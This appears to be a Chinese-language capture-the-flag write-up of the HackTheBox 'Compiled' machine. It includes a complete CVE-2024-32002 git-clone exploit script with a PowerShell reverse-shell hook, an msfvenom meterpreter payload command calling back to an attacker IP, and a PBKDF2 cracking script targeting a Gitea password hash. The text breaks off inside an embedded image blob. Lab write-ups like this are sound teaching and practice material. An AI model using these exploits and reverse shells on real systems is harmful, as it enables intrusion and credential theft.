---
title: "HTB-Compiled"
date: 2024-08-31
categories: 
  - "渗透测试"
tags: 
  - "hackthebox"
  - "windows"
---

## Box Info

| OS | Windows |
| --- | --- |
| Rated Difficulty | Medium |

## Port Scan

```
#linux
nmap -A -Pn 10.10.11.26
```

![](./images/image-119.png)

![](./images/image-120.png)

扫描出来3000和5000端口。

![](./images/image-121.png)

3000端口是一个类似于git的服务，具体是由Gitea驱动的。包含了注册、登录、创建仓库以及拉取代码等等功能。

![](./images/image-122.png)

5000端口是一个类似于编译功能，可以传入仓库地址。

## Git Rce

在3000端口上的richard的Calculator仓库中，发现了git的版本是2.45.0

![](./images/image-123.png)

结合**5000**端口上的clone功能，搜索得到漏洞编号为：**CVE-2024-32002** 的git rce漏洞。

![](./images/image-124.png)

**相关文章：**[Exploiting CVE-2024-32002: RCE via git clone | Amal Murali](https://amalmurali.me/posts/git-rce/)

文章中的示例脚本中是打开一个计算器，那么在这里可以把他改为反弹shell。

![](./images/image-125.png)

根据文章中的描述，需要创建两个空仓库。

![](./images/image-128.png)

```
git config --global protocol.file.allow always
git config --global core.symlinks true
git config --global init.defaultBranch main
rm -rf nothing
rm -rf toSeeHere
git clone http://compiled.htb:3000/hyh/repo1.git
 cd repo1
mkdir -p y/hooks
cat >y/hooks/post-checkout <<EOF
#!bin/sh.exe
powershell -e JABjAGw...
EOF
chmod +x y/hooks/post-checkout
git add y/hooks/post-checkout
git commit -m "post-checkout"
git push
cd ..
git clone http://compiled.htb:3000/hyh/repo2.git
cd repo2
git submodule add --name x/y "http://compiled.htb:3000/hyh/repo1.git" A/modules/x
git commit -m "add-submodule"
printf ".git" >dotgit.txt
git hash-object -w --stdin <dotgit.txt >dot-git.hash
printf "120000 %s 0\ta\n" "$(cat dot-git.hash)" >index.info
git update-index --index-info <index.info
git commit -m "add-symlink"
git push
```

![](./images/image-129.png)

填充到powershell那里来反弹shell。

然后本地运行这个sh脚本

![](./images/image-130.png)

这边准备提交repo2的代码,并且监听4321端口

![](./images/image-131.png)

成功反弹到shell

![](./images/image-132.png)

查看电脑的用户,发现一个Emily用户

![](./images/image-133.png)

在C盘Program Files\\Gitea的data目录下发现一个gitea.db数据文件

![](./images/image-134.png)

这里无法直接下载,要在kali上用metasploit生成木马进行控制.

```
msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.16.24 lport=9876 -f exe -o shell.exe
```

![](./images/image-136.png)

然后windows去curl下载，成功触发。

![](./images/image-137.png)

然后下载db文件

![](./images/image-138.png)

直接打开查看

![](./images/image-141.png)

可以发现密码是经过哈希的，加密方式是pbkdf2，后面的列里还有盐值

这里可以写一个脚本，在网上也能找到

```
import hashlib
import binascii
def pbkdf2_hash(password, salt, iterations=50000, dklen=50):
    hash_value = hashlib.pbkdf2_hmac(
        'sha256',
        password.encode('utf-8'),
        salt,
        iterations,
        dklen
    )
    return hash_value
def find_matching_password(dictionary_file, target_hash, salt, iterations=50000, dklen=50):
    target_hash_bytes = binascii.unhexlify(target_hash)
    with open(dictionary_file, 'r', encoding='utf-8') as file:
        for line in file:
            password = line.strip()
            hash_value = pbkdf2_hash(password, salt, iterations, dklen)
            if hash_value == target_hash_bytes:
                print(f"Found password: {password}")
                return password
    print("Password not found.")
    return None
salt = binascii.unhexlify('227d873cca89103cd83a976bdac52486')
target_hash = '97907280dc24fe517c43475bd218bfad56c25d4d11037d8b6da440efd4d691adfead40330b2aa6aaf1f33621d0d73228fc16'
dictionary_file = '/usr/share/wordlists/rockyou.txt'
find_matching_password(dictionary_file, target_hash, salt)
```

![](data:image/png;base64,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